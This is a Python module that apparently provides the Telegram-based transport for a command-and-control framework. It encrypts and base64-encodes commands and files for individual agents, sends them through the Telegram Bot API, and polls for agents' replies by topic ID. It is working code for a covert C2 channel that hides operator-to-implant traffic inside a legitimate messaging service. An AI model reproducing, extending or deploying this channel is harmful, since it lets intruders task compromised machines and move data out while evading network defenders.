#!/usr/bin/env python3

import json
import base64
import aiohttp
import requests

from abc import ABC, abstractmethod

class CommInterface(ABC):
    @abstractmethod
    def send_msg(self, topic_id: str, agent_id: str, payload: dict, enc_fn: callable):
        pass

    @abstractmethod
    def send_file(self, topic_id: str, agent_id: str, payload: dict, enc_fn: callable, filename: str):
        pass

    @abstractmethod
    async def poll_msg(self, topic_id: str) -> list:
        pass

class TgComm(CommInterface):
    def __init__(self, token: str):
        def get_chat_id() -> int: #lazy
            resp = self.session.get(f"{self.base_url}/getUpdates")
            if resp.ok:
                return resp.json()["result"][0]["message"]["chat"]["id"]
        self.session          = requests.Session()
        self.base_url         = f"https://api.telegram.org/bot{token}"
        self.chat_id          = get_chat_id()
        self.poll_msg_offset  = 0
        self.poll_msg_timeout = 10

    def send_msg(self, topic_id: str, agent_id: str, payload: dict, enc_fn: callable) -> dict:
        json_payload    = json.dumps(payload).encode()
        comp_key        = topic_id + agent_id
        encoded_payload = enc_fn(json_payload, comp_key)
        encoded_data    = base64.b64encode(encoded_payload).decode()
        resp            = self.session.post(
            f"{self.base_url}/sendMessage",
            data={
                "chat_id": self.chat_id,
                "text": f"{topic_id}:{encoded_data}"
            }
        )
        if resp.ok:
            return {"agent_id": agent_id, "msg": "Command sent successfully"}
        else:
            return {"agent_id": agent_id, "err": resp.text}
        
    def send_file(self, topic_id: str, agent_id: str, payload: dict, enc_fn: callable, filename: str):
        json_payload    = json.dumps(payload).encode()
        comp_key        = topic_id + agent_id
        encoded_payload = enc_fn(json_payload, comp_key)
        encoded_data    = base64.b64encode(encoded_payload).decode()
        resp            = self.session.post(
            f"{self.base_url}/sendDocument",
            data={
                "chat_id": self.chat_id,
                "caption": topic_id
            },
            files={
                "document": (filename, encoded_data)
            }
        )
        if resp.ok:
            return {"agent_id": agent_id, "msg": "File sent successfully"}
        else:
            return {"agent_id": agent_id, "err": resp.text}
        
    ## WILL ONLY RECEIVE USER MESSAGES !!!
    async def poll_msg(self, topic_id: str) -> list:
        messages = []
        async with aiohttp.ClientSession() as session:
            params = {
                "offset": self.poll_msg_offset,
                "timeout": 10
            }

            async with session.get(f"{self.base_url}/getUpdates", params=params) as resp:
                if not resp.ok:
                    return []
                
                data = await resp.json()
                updates = data.get("result", [])

                for update in updates:
                    self.poll_msg_offset = update["update_id"] + 1
                    message = update.get("message")
                    if not message:
                        continue
                    self.chat_id = message["chat"]["id"]
                    raw_text = message.get("text", "").split(":")
                    print(raw_text)
                    if raw_text[0] != topic_id:
                        continue
                    messages.append(base64.b64decode(raw_text[1]))
        return messages